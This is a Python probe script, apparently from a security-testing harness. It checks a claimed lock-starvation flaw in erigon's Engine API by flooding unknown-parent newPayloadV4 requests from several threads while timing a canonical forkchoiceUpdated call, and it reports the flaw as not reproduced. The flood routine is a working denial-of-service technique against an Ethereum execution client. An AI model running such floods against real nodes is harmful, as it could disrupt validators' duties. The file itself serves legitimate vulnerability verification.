"""Engine-API lock-starvation probe — EL-GASPER-LIVE-CANONICAL-001 (erigon).

Finding (erigon 03, execution/engineapi/engine_server.go): newPayload for a
side-branch block with an UNKNOWN parent calls StartDownloading and holds the
global s.lock for up to SecondsPerSlot via waitForResponse (which polls without
checking ctx); the getQuickPayloadStatusIfPossible fast path (before the lock)
supposedly returns nil, forcing lock acquisition, so concurrent canonical
newPayload/forkchoiceUpdated are blocked for a full slot -> missed attestations.

This probe tests the *impact* directly: it floods unknown-parent newPayloadV4
(valid blockHash via the RLP header encoder, random unknown parentHash) from
several threads while timing a concurrent canonical forkchoiceUpdatedV3, and
reports whether the canonical call is starved (latency ~ SecondsPerSlot) or stays
fast.

Measured result on erigon 3.5.x: NOT reproduced. An unknown-parent newPayload
returns SYNCING in ~0.01 s — the fast path short-circuits it WITHOUT starting a
download or holding the lock — and a concurrent canonical FCU stays fast (tens of
ms, not seconds). erigon's current fast path handles the unknown-parent case, so
the claimed lock starvation does not occur.
"""

from __future__ import annotations

import copy
import json
import os
import threading
import time
from dataclasses import asdict, dataclass

from .besu_engine_identity import _block_hash, _payload_from_block
from .fcu_ordering import discover_el, _jrpc


@dataclass
class LockStarvationResult:
    reproduced: bool
    client: str
    unknown_parent_status: str          # single-shot status (expect SYNCING)
    unknown_parent_latency_ms: float    # single-shot hold time (expect ~0 if fast path)
    sent_during_flood: int
    canonical_base_ms: float
    canonical_during_median_ms: float
    canonical_during_max_ms: float
    seconds_per_slot_ms: float
    note: str

    def to_json(self) -> str:
        return json.dumps(asdict(self), indent=2)


def run_lock_starvation_probe(enclave: str, client: str = "erigon", *,
                              threads: int = 8, samples: int = 8, seconds_per_slot: float = 6.0) -> LockStarvationResult:
    t = discover_el(enclave, client)
    if t is None:
        raise RuntimeError(f"no {client!r} el- container in enclave {enclave!r}")
    secret = bytes.fromhex(t.jwt_secret)

    def head() -> dict:
        return _jrpc(t.rpc_url, "eth_getBlockByNumber", ["latest", False])["result"]

    blk = _jrpc(t.rpc_url, "eth_getBlockByNumber", [hex(int(head()["number"], 16) - 5), True])["result"]

    def unknown_parent_payload():
        sb = copy.deepcopy(blk)
        sb["parentHash"] = "0x" + os.urandom(32).hex()  # unknown -> would StartDownloading
        return _payload_from_block(sb, sb["stateRoot"], _block_hash(sb, sb["stateRoot"])), sb["parentBeaconBlockRoot"]

    # single-shot: does one unknown-parent newPayload block for ~a slot?
    p, pbr = unknown_parent_payload()
    s0 = time.time()
    r0 = _jrpc(t.engine_url, "engine_newPayloadV4", [p, [], pbr, []], secret, timeout=30)
    single_ms = (time.time() - s0) * 1000
    single_status = (r0.get("result") or r0.get("error") or {}).get("status", str(r0)[:30])

    def canonical_fcu() -> float:
        hb = head()
        s = time.time()
        _jrpc(t.engine_url, "engine_forkchoiceUpdatedV3",
              [{"headBlockHash": hb["hash"], "safeBlockHash": hb["hash"], "finalizedBlockHash": hb["hash"]}, None],
              secret, timeout=30)
        return time.time() - s

    base = sorted(canonical_fcu() for _ in range(5))[2]

    stop = threading.Event()
    sent = [0]

    def flood():
        while not stop.is_set():
            pp, pb = unknown_parent_payload()
            _jrpc(t.engine_url, "engine_newPayloadV4", [pp, [], pb, []], secret, timeout=30)
            sent[0] += 1

    workers = [threading.Thread(target=flood, daemon=True) for _ in range(threads)]
    for w in workers:
        w.start()
    during = sorted(canonical_fcu() for _ in range(samples))
    stop.set()
    time.sleep(0.5)

    median = during[len(during) // 2]
    # starvation == canonical call blocked on the order of a slot.
    reproduced = median > seconds_per_slot * 0.5
    note = (
        f"REPRODUCED: canonical FCU starved to {median*1000:.0f} ms (~SecondsPerSlot) "
        f"while unknown-parent newPayloads hold the lock."
        if reproduced else
        f"NOT REPRODUCED: unknown-parent newPayload returns {single_status} in "
        f"{single_ms:.0f} ms (fast path, no download/lock); concurrent canonical FCU "
        f"stays fast ({median*1000:.0f} ms median vs {base*1000:.0f} ms base, "
        f"<< SecondsPerSlot {seconds_per_slot*1000:.0f} ms). The claimed global-lock "
        f"starvation does not occur on this erigon."
    )
    return LockStarvationResult(
        reproduced=reproduced, client=client, unknown_parent_status=single_status,
        unknown_parent_latency_ms=round(single_ms, 1), sent_during_flood=sent[0],
        canonical_base_ms=round(base * 1000, 1), canonical_during_median_ms=round(median * 1000, 1),
        canonical_during_max_ms=round(max(during) * 1000, 1), seconds_per_slot_ms=seconds_per_slot * 1000,
        note=note,
    )


if __name__ == "__main__":
    import sys
    enclave = sys.argv[1] if len(sys.argv) > 1 else "repro-besu-erigon"
    client = sys.argv[2] if len(sys.argv) > 2 else "erigon"
    print(run_lock_starvation_probe(enclave, client).to_json())
